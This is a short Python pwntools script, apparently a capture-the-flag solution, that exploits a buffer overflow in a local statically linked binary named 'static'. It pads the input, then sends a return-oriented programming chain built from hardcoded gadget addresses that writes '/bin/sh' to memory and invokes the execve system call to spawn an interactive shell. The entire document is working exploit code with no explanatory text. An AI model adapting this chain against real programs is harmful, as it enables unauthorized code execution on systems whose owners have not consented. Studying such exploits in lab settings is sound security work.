from pwn import *

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *0x401801
'''

#p = gdb.debug("./static", gdbscript = script)
p = process("./static")

pop_rdi = 0x0000000000401fe0
pop_rsi = 0x00000000004062d8
pop_rdx_rbx = 0x000000000045e467
mov_qword_ptr_rdi_rdx = 0x000000000045a153
rw_section = 0x4a0000 - 0x100
syscall = 0x0000000000401194
pop_rax = 0x000000000041069c

rop = [
p64(pop_rdi), p64(rw_section),
p64(pop_rdx_rbx), b"/bin/sh\x00",
p64(0), p64(mov_qword_ptr_rdi_rdx),
p64(pop_rsi), p64(0),
p64(pop_rdx_rbx), p64(0) * 2,
p64(pop_rax), p64(59),
p64(syscall)
]
payload = b"A" * 0xA + p64(0) +  b"".join(rop)
p_s(payload)

p.interactive()